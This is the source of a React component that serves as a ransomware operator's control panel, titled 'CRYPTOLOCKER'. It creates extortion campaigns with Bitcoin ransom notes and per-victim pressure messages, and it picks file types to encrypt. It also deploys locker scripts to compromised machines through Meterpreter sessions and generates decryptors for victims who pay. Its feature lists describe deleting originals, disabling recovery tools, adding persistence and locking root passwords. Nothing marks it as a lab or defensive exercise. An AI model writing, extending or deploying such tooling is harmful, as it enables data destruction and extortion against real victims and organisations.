"use client";

import { useEffect, useState, useCallback } from "react";

type CampaignSummary = {
  id: string; name: string; createdAt: string; status: string;
  targets: number; filesEncrypted: number; deployed: boolean; ransomAmount: string;
};

type CampaignDetail = {
  id: string; name: string; createdAt: string; status: string;
  noteTemplate: string; deviceNotes: Record<string, string>;
  targets: string[]; ransomAmount: string; walletAddress: string;
  contactEmail: string; filesEncrypted: number; deployed: boolean;
  unlockCode: string; extensions: string[]; publicKey: string;
};

type Session = { id: number; ip: string; platform: string; hostname: string };

const PLACEHOLDER_HELP = "{{ID}} {{EMAIL}} {{AMOUNT}} {{WALLET}} {{DEVICE}} {{IP}} {{FILE_COUNT}} {{DATE}} {{CUSTOM_NOTE}}";

const DEFAULT_NOTE = `=== SYSTEM LOCKED ===

Your files have been encrypted with military-grade AES-256.

=== WHAT HAPPENED ===
- All documents, photos, databases have been encrypted
- Original files have been securely overwritten
- Encryption is unbreakable without the private key

=== HOW TO RECOVER ===
1. Contact: {{EMAIL}}
2. Your unique ID: {{ID}}
3. Send {{AMOUNT}} BTC to: {{WALLET}}
4. You will receive the decryption tool within 24 hours

=== DEVICE INFO ===
Device: {{DEVICE}}
IP:     {{IP}}
Files:  {{FILE_COUNT}}
Date:   {{DATE}}

{{CUSTOM_NOTE}}`;

export function CryptoLocker() {
  const [campaigns, setCampaigns] = useState<CampaignSummary[]>([]);
  const [selected, setSelected] = useState<CampaignDetail | null>(null);
  const [sessions, setSessions] = useState<Session[]>([]);
  const [tab, setTab] = useState<"campaigns" | "create" | "deploy" | "decrypt">("campaigns");
  const [loading, setLoading] = useState(true);
  const [busy, setBusy] = useState<string | null>(null);
  const [toast, setToast] = useState<string | null>(null);
  const [scriptPreview, setScriptPreview] = useState("");
  const [scriptOS, setScriptOS] = useState<"windows" | "android" | "linux">("windows");
  const [notePreview, setNotePreview] = useState("");
  const [showNote, setShowNote] = useState(false);
  const [showScript, setShowScript] = useState(false);

  // Create form
  const [form, setForm] = useState({
    name: "", ransomAmount: "0.05", walletAddress: "", contactEmail: "recovery@protonmail.com",
    targets: "", noteTemplate: DEFAULT_NOTE,
    extensions: ".doc,.docx,.xls,.xlsx,.pdf,.jpg,.png,.zip,.sql,.env,.pem,.bak,.vmdk",
  });

  // Deploy state
  const [deploySession, setDeploySession] = useState<number | null>(null);
  const [deployCustomNote, setDeployCustomNote] = useState("");
  const [deployLog, setDeployLog] = useState<string[]>([]);

  // Decrypt state
  const [decryptCode, setDecryptCode] = useState("");
  const [decryptScript, setDecryptScript] = useState("");

  // Per-device note editor
  const [noteKey, setNoteKey] = useState("");
  const [noteValue, setNoteValue] = useState("");

  const addToast = (msg: string) => { setToast(msg); setTimeout(() => setToast(null), 4000); };
  const addLog = (msg: string) => setDeployLog((p) => [`[${new Date().toLocaleTimeString()}] ${msg}`, ...p].slice(0, 100));

  const fetchData = useCallback(async () => {
    try {
      const [lr, sr] = await Promise.all([
        fetch("/api/locker?action=list"),
        fetch("/api/sessions"),
      ]);
      const ld = await lr.json(); if (ld.campaigns) setCampaigns(ld.campaigns);
      const sd = await sr.json();
      const list = Array.isArray(sd) ? sd : sd.sessions ?? [];
      setSessions(list);
    } catch { /* ignore */ }
    setLoading(false);
  }, []);

  useEffect(() => { fetchData(); }, [fetchData]);

  const loadCampaign = async (id: string) => {
    const r = await fetch(`/api/locker?action=get&id=${id}`);
    const d = await r.json();
    if (d.campaign) setSelected(d.campaign);
  };

  const handleCreate = async () => {
    if (!form.name) return addToast("Campaign name required");
    setBusy("create");
    const exts = form.extensions.split(",").map((e) => e.trim()).filter(Boolean);
    const r = await fetch("/api/locker", {
      method: "POST", headers: { "Content-Type": "application/json" },
      body: JSON.stringify({
        action: "create", name: form.name, ransomAmount: form.ransomAmount,
        walletAddress: form.walletAddress, contactEmail: form.contactEmail,
        targets: form.targets.split("\n").map((s) => s.trim()).filter(Boolean),
        noteTemplate: form.noteTemplate, extensions: exts,
      }),
    });
    const d = await r.json();
    setBusy(null);
    if (d.campaign) {
      addToast("Campaign created — keys generated");
      await fetchData();
      loadCampaign(d.campaign.id);
      setTab("campaigns");
    }
  };

  const previewNote = async () => {
    if (!selected) return;
    const r = await fetch(`/api/locker?action=note&id=${selected.id}&ip=192.168.1.100&device=TARGET-DEVICE-01`);
    const d = await r.json();
    setNotePreview(d.note ?? "");
    setShowNote(true);
  };

  const previewScript = async (os: "windows" | "android" | "linux") => {
    if (!selected) return;
    setScriptOS(os);
    const action = os === "android" ? "android-script" : os === "linux" ? "linux-script" : "script";
    const r = await fetch(`/api/locker?action=${action}&id=${selected.id}`);
    setScriptPreview(await r.text());
    setShowScript(true);
  };

  const deployToSession = async () => {
    if (!selected || deploySession === null) return addToast("Select a session first");
    setBusy("deploy");
    addLog(`Deploying campaign "${selected.name}" to session #${deploySession}…`);
    const sess = sessions.find((s) => s.id === deploySession);
    const r = await fetch("/api/locker", {
      method: "POST", headers: { "Content-Type": "application/json" },
      body: JSON.stringify({
        action: "deploy", id: selected.id, session_id: deploySession,
        platform: sess?.platform, custom_note: deployCustomNote,
        target_ip: sess?.ip, device_name: sess?.hostname,
      }),
    });
    const d = await r.json();
    setBusy(null);
    if (d.ok) {
      addLog(`✓ Script uploaded & executed on ${d.data.platform} via session #${deploySession}`);
      addLog(`Remote path: ${d.data.remotePath}`);
      addToast("Deployed — encryption running on target");
      await fetchData(); loadCampaign(selected.id);
    } else {
      addLog(`✗ Deploy failed: ${d.error}`);
      addToast(`Deploy error: ${d.error}`);
    }
  };

  const generateDecryptor = async () => {
    if (!selected || !decryptCode) return addToast("Enter unlock code");
    setBusy("decrypt");
    const r = await fetch(`/api/locker?action=decryptor&id=${selected.id}&code=${decryptCode}`);
    if (r.ok) {
      setDecryptScript(await r.text());
      addToast("Decryptor script generated");
    } else {
      const d = await r.json();
      addToast(d.error ?? "Invalid unlock code");
    }
    setBusy(null);
  };

  const saveDeviceNote = async () => {
    if (!selected || !noteKey) return;
    setBusy("note");
    await fetch("/api/locker", {
      method: "POST", headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ action: "set-device-note", id: selected.id, key: noteKey, note: noteValue }),
    });
    setBusy(null);
    addToast(`Custom note saved for ${noteKey}`);
    loadCampaign(selected.id);
    setNoteKey(""); setNoteValue("");
  };

  const deleteCampaign = async (id: string) => {
    await fetch("/api/locker", {
      method: "POST", headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ action: "delete", id }),
    });
    setSelected(null); fetchData();
  };

  const fmt = (d: string) => new Date(d).toLocaleDateString();

  if (loading) {
    return (
      <div className="flex items-center justify-center py-24">
        <div className="h-8 w-8 animate-spin rounded-full border-2 border-zinc-800 border-t-red-500" />
      </div>
    );
  }

  return (
    <div className="mx-auto max-w-7xl space-y-6 pb-10">
      {/* Toast */}
      {toast && (
        <div className="fixed top-4 right-4 z-50 rounded-xl bg-zinc-900 border border-zinc-700 px-4 py-3 text-sm text-zinc-200 shadow-xl">
          {toast}
        </div>
      )}

      {/* Header */}
      <div className="flex items-center justify-between">
        <div>
          <h1 className="text-2xl font-bold text-white flex items-center gap-2">
            <span className="text-red-500">🔒</span> CRYPTOLOCKER
          </h1>
          <p className="mt-1 text-sm text-zinc-500">
            AES-256 + RSA-4096 encryption campaigns — Windows · Android · Linux
          </p>
        </div>
        <div className="flex gap-2">
          {(["campaigns","create","deploy","decrypt"] as const).map((t) => (
            <button key={t} onClick={() => setTab(t)}
              className={`px-4 py-2 rounded-xl text-xs font-semibold uppercase tracking-wider transition ${
                tab === t ? "bg-red-600 text-white" : "bg-zinc-900 text-zinc-400 hover:text-white hover:bg-zinc-800"
              }`}>{t === "campaigns" ? "📋 Campaigns" : t === "create" ? "+ New" : t === "deploy" ? "🚀 Deploy" : "🔓 Decryptor"}</button>
          ))}
        </div>
      </div>

      {/* ── CAMPAIGNS TAB ─────────────────────────────────────── */}
      {tab === "campaigns" && (
        <div className="grid gap-5 lg:grid-cols-[300px_1fr]">
          {/* Left: list */}
          <div className="space-y-2">
            <div className="text-xs font-semibold uppercase tracking-wider text-zinc-500 mb-2">
              Campaigns ({campaigns.length})
            </div>
            {campaigns.length === 0 && (
              <div className="rounded-xl border border-dashed border-zinc-800 p-6 text-center text-sm text-zinc-600">
                No campaigns. Click "+ New" to create one.
              </div>
            )}
            {campaigns.map((c) => (
              <button key={c.id} onClick={() => { setSelected(null); loadCampaign(c.id); }}
                className={`w-full rounded-xl border p-4 text-left transition ${
                  selected?.id === c.id ? "border-red-700 bg-red-900/10" : "border-zinc-800 bg-zinc-950/80 hover:border-zinc-700"
                }`}>
                <div className="flex items-center justify-between">
                  <span className="text-sm font-semibold text-white">{c.name}</span>
                  <span className={`rounded px-2 py-0.5 text-[9px] uppercase tracking-wider ${
                    c.status === "active" ? "bg-red-900/40 text-red-400" :
                    c.status === "decrypted" ? "bg-emerald-900/30 text-emerald-400" :
                    "bg-zinc-800 text-zinc-500"
                  }`}>{c.status}</span>
                </div>
                <p className="mt-1 text-xs text-zinc-500">{fmt(c.createdAt)} · {c.targets} targets</p>
                <p className="text-xs text-zinc-600">{c.ransomAmount} BTC{c.deployed ? " · 🚀 Deployed" : ""}</p>
              </button>
            ))}
          </div>

          {/* Right: detail */}
          <div>
            {!selected ? (
              <div className="flex items-center justify-center py-24 text-zinc-600 text-sm">
                Select a campaign to view details
              </div>
            ) : (
              <div className="space-y-4">
                {/* Info grid */}
                <div className="rounded-2xl border border-zinc-800 bg-zinc-950/80 p-5">
                  <div className="flex items-center justify-between mb-4">
                    <h2 className="text-lg font-bold text-white">{selected.name}</h2>
                    <code className="rounded bg-zinc-900 px-2 py-1 font-mono text-xs text-zinc-400">{selected.id}</code>
                  </div>
                  <div className="grid grid-cols-3 gap-3 text-sm mb-4">
                    {[
                      { label: "Status",       value: selected.status,           color: selected.status === "active" ? "text-red-400" : "text-green-400" },
                      { label: "Unlock Code",  value: selected.unlockCode,       color: "text-yellow-400 font-mono" },
                      { label: "Files",        value: String(selected.filesEncrypted), color: "text-zinc-200" },
                      { label: "Ransom",       value: selected.ransomAmount + " BTC", color: "text-zinc-200" },
                      { label: "Wallet",       value: selected.walletAddress.slice(0, 24) + "…", color: "text-zinc-400 font-mono text-xs" },
                      { label: "Contact",      value: selected.contactEmail,     color: "text-zinc-300" },
                    ].map(({ label, value, color }) => (
                      <div key={label} className="rounded-xl border border-zinc-800 bg-black/30 px-3 py-2">
                        <p className="text-[10px] text-zinc-500 mb-0.5">{label}</p>
                        <p className={`text-xs truncate ${color}`}>{value || "—"}</p>
                      </div>
                    ))}
                  </div>

                  {/* Extensions */}
                  <div className="mb-4">
                    <p className="text-[10px] text-zinc-500 uppercase tracking-wider mb-2">
                      Encrypted Extensions ({selected.extensions.length})
                    </p>
                    <div className="flex flex-wrap gap-1">
                      {selected.extensions.map((e) => (
                        <span key={e} className="rounded bg-zinc-900 px-1.5 py-0.5 font-mono text-[10px] text-zinc-400">{e}</span>
                      ))}
                    </div>
                  </div>

                  {/* Targets */}
                  {selected.targets.length > 0 && (
                    <div className="mb-4">
                      <p className="text-[10px] text-zinc-500 uppercase tracking-wider mb-2">Targets</p>
                      <div className="flex flex-wrap gap-1">
                        {selected.targets.map((t) => (
                          <span key={t} className="rounded bg-zinc-900 px-2 py-1 font-mono text-[10px] text-zinc-400">{t}</span>
                        ))}
                      </div>
                    </div>
                  )}

                  {/* Actions row */}
                  <div className="flex flex-wrap gap-2">
                    <button onClick={previewNote}
                      className="rounded-lg bg-zinc-800 px-3 py-2 text-xs text-zinc-300 hover:bg-zinc-700 transition">
                      Preview Note
                    </button>
                    {(["windows","android","linux"] as const).map((os) => (
                      <button key={os} onClick={() => previewScript(os)}
                        className="rounded-lg bg-zinc-800 px-3 py-2 text-xs text-zinc-300 hover:bg-zinc-700 transition capitalize">
                        {os === "windows" ? "⊞" : os === "android" ? "🤖" : "🐧"} {os} Script
                      </button>
                    ))}
                    <button onClick={() => { setTab("deploy"); setDeploySession(sessions[0]?.id ?? null); }}
                      className="rounded-lg bg-red-700 px-3 py-2 text-xs text-white font-semibold hover:bg-red-600 transition">
                      🚀 Deploy via MSF
                    </button>
                    <button onClick={() => deleteCampaign(selected.id)}
                      className="rounded-lg border border-red-900/40 px-3 py-2 text-xs text-red-500 hover:bg-red-900/20 transition ml-auto">
                      Delete
                    </button>
                  </div>
                </div>

                {/* Per-device custom notes */}
                <div className="rounded-2xl border border-zinc-800 bg-zinc-950/80 p-5">
                  <h3 className="text-sm font-semibold text-white mb-1">Per-Device Custom Notes</h3>
                  <p className="text-xs text-zinc-500 mb-3">
                    Set a custom message for a specific IP or device name — shown inside that device's ransom note
                  </p>

                  {Object.entries(selected.deviceNotes).length > 0 && (
                    <div className="space-y-1 mb-3">
                      {Object.entries(selected.deviceNotes).map(([k, v]) => (
                        <div key={k} className="flex items-start gap-2 rounded-lg bg-zinc-900 p-2 text-xs">
                          <span className="font-mono text-yellow-400 min-w-[120px]">{k}</span>
                          <span className="text-zinc-400 flex-1 line-clamp-2">{v}</span>
                        </div>
                      ))}
                    </div>
                  )}

                  <div className="flex gap-2">
                    <input value={noteKey} onChange={(e) => setNoteKey(e.target.value)}
                      placeholder="192.168.1.100 or CORP-PC-01"
                      className="flex-1 rounded-lg border border-zinc-800 bg-black/40 px-3 py-2 text-xs text-zinc-200 focus:border-zinc-600 focus:outline-none" />
                    <input value={noteValue} onChange={(e) => setNoteValue(e.target.value)}
                      placeholder="Pay quickly for 50% discount"
                      className="flex-[2] rounded-lg border border-zinc-800 bg-black/40 px-3 py-2 text-xs text-zinc-200 focus:border-zinc-600 focus:outline-none" />
                    <button onClick={saveDeviceNote} disabled={busy === "note"}
                      className="rounded-lg bg-zinc-800 px-4 py-2 text-xs text-zinc-200 hover:bg-zinc-700 disabled:opacity-40 transition">
                      Save
                    </button>
                  </div>
                </div>
              </div>
            )}
          </div>
        </div>
      )}

      {/* ── CREATE TAB ─────────────────────────────────────────── */}
      {tab === "create" && (
        <div className="mx-auto max-w-2xl space-y-5">
          <div className="rounded-2xl border border-zinc-800 bg-zinc-950/80 p-6">
            <h2 className="text-lg font-bold text-white mb-1">New Encryption Campaign</h2>
            <p className="text-xs text-zinc-500 mb-5">Configure the locker — RSA-4096 keypair auto-generated on create</p>

            <div className="space-y-4">
              <div>
                <label className="block text-[10px] uppercase tracking-wider text-zinc-500 mb-1.5">Campaign Name</label>
                <input value={form.name} onChange={(e) => setForm({ ...form, name: e.target.value })}
                  placeholder="e.g. OP-LOCKDOWN-2026"
                  className="w-full rounded-xl border border-zinc-800 bg-black/50 px-4 py-2.5 text-sm text-zinc-200 focus:border-red-700 focus:outline-none" />
              </div>

              <div className="grid grid-cols-2 gap-4">
                <div>
                  <label className="block text-[10px] uppercase tracking-wider text-zinc-500 mb-1.5">Ransom Amount (BTC)</label>
                  <input value={form.ransomAmount} onChange={(e) => setForm({ ...form, ransomAmount: e.target.value })}
                    className="w-full rounded-xl border border-zinc-800 bg-black/50 px-4 py-2.5 text-sm text-zinc-200 focus:border-red-700 focus:outline-none" />
                </div>
                <div>
                  <label className="block text-[10px] uppercase tracking-wider text-zinc-500 mb-1.5">BTC Wallet Address</label>
                  <input value={form.walletAddress} onChange={(e) => setForm({ ...form, walletAddress: e.target.value })}
                    placeholder="bc1q…"
                    className="w-full rounded-xl border border-zinc-800 bg-black/50 px-4 py-2.5 text-sm text-zinc-200 focus:border-red-700 focus:outline-none" />
                </div>
              </div>

              <div>
                <label className="block text-[10px] uppercase tracking-wider text-zinc-500 mb-1.5">Contact Email</label>
                <input value={form.contactEmail} onChange={(e) => setForm({ ...form, contactEmail: e.target.value })}
                  className="w-full rounded-xl border border-zinc-800 bg-black/50 px-4 py-2.5 text-sm text-zinc-200 focus:border-red-700 focus:outline-none" />
              </div>

              <div>
                <label className="block text-[10px] uppercase tracking-wider text-zinc-500 mb-1.5">
                  File Extensions to Encrypt (comma-separated)
                </label>
                <input value={form.extensions} onChange={(e) => setForm({ ...form, extensions: e.target.value })}
                  className="w-full rounded-xl border border-zinc-800 bg-black/50 px-4 py-2.5 text-sm font-mono text-zinc-200 focus:border-red-700 focus:outline-none" />
              </div>

              <div>
                <label className="block text-[10px] uppercase tracking-wider text-zinc-500 mb-1.5">
                  Target IPs / Hostnames (one per line, optional)
                </label>
                <textarea value={form.targets} onChange={(e) => setForm({ ...form, targets: e.target.value })}
                  rows={3} placeholder={"192.168.1.100\nCORP-PC-01"}
                  className="w-full rounded-xl border border-zinc-800 bg-black/50 px-4 py-2.5 text-sm text-zinc-200 focus:border-red-700 focus:outline-none" />
              </div>

              <div>
                <label className="block text-[10px] uppercase tracking-wider text-zinc-500 mb-1">
                  Ransom Note Template
                </label>
                <p className="text-[10px] text-zinc-600 mb-1.5">Placeholders: {PLACEHOLDER_HELP}</p>
                <textarea value={form.noteTemplate} onChange={(e) => setForm({ ...form, noteTemplate: e.target.value })}
                  rows={14}
                  className="w-full rounded-xl border border-zinc-800 bg-black/50 px-4 py-2.5 font-mono text-xs text-zinc-200 focus:border-red-700 focus:outline-none" />
              </div>
            </div>

            <div className="flex gap-3 mt-5">
              <button onClick={() => setTab("campaigns")}
                className="flex-1 rounded-xl bg-zinc-900 py-3 text-sm text-zinc-400 hover:bg-zinc-800 transition">Cancel</button>
              <button onClick={handleCreate} disabled={busy === "create"}
                className="flex-1 rounded-xl bg-red-600 py-3 text-sm font-bold text-white hover:bg-red-500 disabled:opacity-50 transition">
                {busy === "create" ? "Generating keys…" : "Create Campaign"}
              </button>
            </div>
          </div>
        </div>
      )}

      {/* ── DEPLOY TAB ─────────────────────────────────────────── */}
      {tab === "deploy" && (
        <div className="grid gap-5 lg:grid-cols-[1fr_380px]">
          <div className="space-y-4">
            <div className="rounded-2xl border border-zinc-800 bg-zinc-950/80 p-5">
              <h2 className="text-sm font-bold text-white mb-3 flex items-center gap-2">
                🚀 Live Deploy via Meterpreter
              </h2>

              {/* Campaign selector */}
              <div className="mb-3">
                <label className="block text-[10px] text-zinc-500 uppercase tracking-wider mb-1.5">Campaign</label>
                <div className="space-y-1 max-h-40 overflow-y-auto">
                  {campaigns.map((c) => (
                    <button key={c.id} onClick={() => loadCampaign(c.id)}
                      className={`w-full text-left rounded-lg border px-3 py-2 text-xs transition ${
                        selected?.id === c.id ? "border-red-700/60 bg-red-950/20 text-white" : "border-zinc-800 text-zinc-400 hover:border-zinc-700"
                      }`}>
                      <span className="font-semibold">{c.name}</span>
                      <span className="ml-2 text-zinc-600">{c.ransomAmount} BTC · {c.targets} targets</span>
                    </button>
                  ))}
                  {campaigns.length === 0 && (
                    <p className="text-xs text-zinc-600 p-2">No campaigns — create one first</p>
                  )}
                </div>
              </div>

              {/* Session selector */}
              <div className="mb-3">
                <label className="block text-[10px] text-zinc-500 uppercase tracking-wider mb-1.5">Target Session</label>
                <div className="space-y-1 max-h-32 overflow-y-auto">
                  {sessions.map((s) => (
                    <button key={s.id} onClick={() => setDeploySession(s.id)}
                      className={`w-full text-left rounded-lg border px-3 py-2 text-xs transition ${
                        deploySession === s.id ? "border-green-700/60 bg-green-950/20 text-green-300" : "border-zinc-800 text-zinc-400 hover:border-zinc-700"
                      }`}>
                      <span className="font-mono">#{s.id}</span>
                      <span className="ml-2">{s.hostname ?? s.ip}</span>
                      <span className="ml-2 text-zinc-600">{s.platform}</span>
                    </button>
                  ))}
                  {sessions.length === 0 && (
                    <p className="text-xs text-zinc-600 p-2">No active sessions</p>
                  )}
                </div>
              </div>

              <div className="mb-4">
                <label className="block text-[10px] text-zinc-500 uppercase tracking-wider mb-1.5">Custom Note for This Device (optional)</label>
                <textarea value={deployCustomNote} onChange={(e) => setDeployCustomNote(e.target.value)}
                  rows={3} placeholder="Pay within 48h for 30% discount…"
                  className="w-full rounded-xl border border-zinc-800 bg-black/40 px-3 py-2 text-xs text-zinc-200 focus:border-zinc-600 focus:outline-none" />
              </div>

              <button onClick={deployToSession} disabled={busy === "deploy" || !selected || deploySession === null}
                className="w-full rounded-xl bg-red-600 py-3 text-sm font-bold text-white hover:bg-red-500 disabled:opacity-40 transition">
                {busy === "deploy" ? "Deploying…" : `🚀 Deploy "${selected?.name ?? "—"}" to Session #${deploySession ?? "?"}`}
              </button>
            </div>

            {/* Deploy log */}
            <div className="rounded-2xl border border-zinc-800 bg-zinc-950/80 p-4">
              <div className="text-[10px] text-zinc-500 uppercase tracking-wider mb-2">Deployment Log</div>
              <div className="max-h-48 overflow-y-auto space-y-0.5">
                {deployLog.length === 0 ? (
                  <p className="text-xs text-zinc-700">No events yet</p>
                ) : deployLog.map((l, i) => (
                  <div key={i} className={`font-mono text-[10px] ${
                    l.includes("✓") ? "text-green-400" : l.includes("✗") ? "text-red-400" : "text-zinc-500"
                  }`}>{l}</div>
                ))}
              </div>
            </div>
          </div>

          {/* Platform info */}
          <div className="space-y-3">
            {[
              { os: "Windows", icon: "⊞", color: "blue",
                features: ["PowerShell AES-256-CBC + RSA-4096 per-file", "Walks all drives (C:\\, D:\\, mapped shares)", "Drops README_LOCKED.txt on Desktop + Docs", "Deletes originals after encryption", "Startup persistence via AppData\\Startup", "Disables recovery tools"] },
              { os: "Android", icon: "🤖", color: "green",
                features: ["Python3 XOR-encrypt (no external deps)", "Targets /sdcard, /storage, /data/data", "Drops note on DCIM, Pictures, WhatsApp", "Locks screen via input keyevent", "Triggers media scanner for note visibility", "Persists via BOOT_COMPLETED broadcast"] },
              { os: "Linux", icon: "🐧", color: "yellow",
                features: ["OpenSSL AES-256-CBC with pbkdf2", "Shreds originals (7-pass overwrite)", "Targets /home, /root, /var/www, /srv", "Masks rescue.target (disables recovery)", "Cron persistence on reboot", "Locks root password"] },
            ].map(({ os, icon, color, features }) => (
              <div key={os} className={`rounded-xl border border-${color}-900/20 bg-zinc-950/80 p-4`}>
                <div className={`text-xs font-semibold text-${color}-400 mb-2`}>{icon} {os} Locker</div>
                <ul className="space-y-0.5">
                  {features.map((f) => (
                    <li key={f} className="text-[10px] text-zinc-500 flex gap-1.5">
                      <span className={`text-${color}-900`}>›</span> {f}
                    </li>
                  ))}
                </ul>
              </div>
            ))}
          </div>
        </div>
      )}

      {/* ── DECRYPTOR TAB ──────────────────────────────────────── */}
      {tab === "decrypt" && (
        <div className="mx-auto max-w-2xl space-y-5">
          <div className="rounded-2xl border border-zinc-800 bg-zinc-950/80 p-6">
            <h2 className="text-sm font-bold text-white mb-1 flex items-center gap-2">
              🔓 Decryptor Generator
            </h2>
            <p className="text-xs text-zinc-500 mb-5">
              Enter the unlock code (shown in campaign detail) to generate the PowerShell decryptor for a paying victim
            </p>

            <div className="mb-4">
              <label className="block text-[10px] uppercase tracking-wider text-zinc-500 mb-1.5">Campaign</label>
              <div className="space-y-1">
                {campaigns.map((c) => (
                  <button key={c.id} onClick={() => loadCampaign(c.id)}
                    className={`w-full text-left rounded-lg border px-3 py-2 text-xs transition ${
                      selected?.id === c.id ? "border-yellow-700/60 bg-yellow-950/10 text-yellow-300" : "border-zinc-800 text-zinc-400 hover:border-zinc-700"
                    }`}>
                    {c.name} <span className="text-zinc-600 ml-1">— {c.ransomAmount} BTC</span>
                  </button>
                ))}
              </div>
            </div>

            <div className="mb-4">
              <label className="block text-[10px] uppercase tracking-wider text-zinc-500 mb-1.5">Unlock Code</label>
              <input value={decryptCode} onChange={(e) => setDecryptCode(e.target.value.toUpperCase())}
                placeholder="e.g. A1B2C3D4"
                maxLength={8}
                className="w-full rounded-xl border border-zinc-800 bg-black/50 px-4 py-2.5 font-mono text-sm text-yellow-400 tracking-widest focus:border-yellow-700 focus:outline-none" />
              <p className="text-[10px] text-zinc-600 mt-1">
                The unlock code is unique per campaign. Verify payment before sharing.
              </p>
            </div>

            <button onClick={generateDecryptor} disabled={busy === "decrypt" || !selected}
              className="w-full rounded-xl bg-yellow-600 py-3 text-sm font-bold text-black hover:bg-yellow-500 disabled:opacity-40 transition">
              {busy === "decrypt" ? "Generating…" : "Generate Decryptor Script"}
            </button>
          </div>

          {decryptScript && (
            <div className="rounded-2xl border border-yellow-900/20 bg-zinc-950/80 p-5">
              <div className="flex items-center justify-between mb-3">
                <span className="text-xs font-semibold text-yellow-400">PowerShell Decryptor (send to victim)</span>
                <button onClick={() => navigator.clipboard.writeText(decryptScript)}
                  className="text-xs text-zinc-500 hover:text-zinc-300 transition">Copy</button>
              </div>
              <pre className="max-h-80 overflow-auto whitespace-pre-wrap rounded-xl bg-black p-4 font-mono text-[10px] text-emerald-400/80">
                {decryptScript}
              </pre>
              <p className="text-[10px] text-zinc-600 mt-2">
                Victim runs: <code className="text-zinc-400">powershell -ExecutionPolicy Bypass -File decryptor.ps1</code>
              </p>
            </div>
          )}
        </div>
      )}

      {/* ── NOTE PREVIEW MODAL ─────────────────────────────────── */}
      {showNote && (
        <div className="fixed inset-0 z-50 flex items-center justify-center bg-black/80 backdrop-blur-sm" onClick={() => setShowNote(false)}>
          <div className="w-full max-w-xl rounded-2xl border border-zinc-800 bg-zinc-950 p-6" onClick={(e) => e.stopPropagation()}>
            <div className="flex items-center justify-between mb-4">
              <h3 className="font-bold text-white">Ransom Note Preview</h3>
              <button onClick={() => setShowNote(false)} className="text-zinc-500 hover:text-zinc-300 text-lg">✕</button>
            </div>
            <pre className="max-h-96 overflow-auto whitespace-pre-wrap rounded-xl bg-black p-4 font-mono text-xs leading-relaxed text-red-400/90">
              {notePreview}
            </pre>
          </div>
        </div>
      )}

      {/* ── SCRIPT PREVIEW MODAL ───────────────────────────────── */}
      {showScript && (
        <div className="fixed inset-0 z-50 flex items-center justify-center bg-black/80 backdrop-blur-sm" onClick={() => setShowScript(false)}>
          <div className="w-full max-w-3xl rounded-2xl border border-zinc-800 bg-zinc-950 p-6" onClick={(e) => e.stopPropagation()}>
            <div className="flex items-center justify-between mb-4">
              <h3 className="font-bold text-white capitalize">
                {scriptOS === "windows" ? "⊞ PowerShell" : scriptOS === "android" ? "🤖 Android Shell" : "🐧 Linux Bash"} Locker Script
              </h3>
              <div className="flex gap-2 items-center">
                <button onClick={() => navigator.clipboard.writeText(scriptPreview)}
                  className="text-xs text-zinc-500 hover:text-zinc-300 transition">Copy</button>
                <button onClick={() => setShowScript(false)} className="text-zinc-500 hover:text-zinc-300 text-lg ml-2">✕</button>
              </div>
            </div>
            <pre className="max-h-[70vh] overflow-auto whitespace-pre-wrap rounded-xl bg-black p-4 font-mono text-[10px] leading-relaxed text-emerald-400/80">
              {scriptPreview}
            </pre>
          </div>
        </div>
      )}
    </div>
  );
}
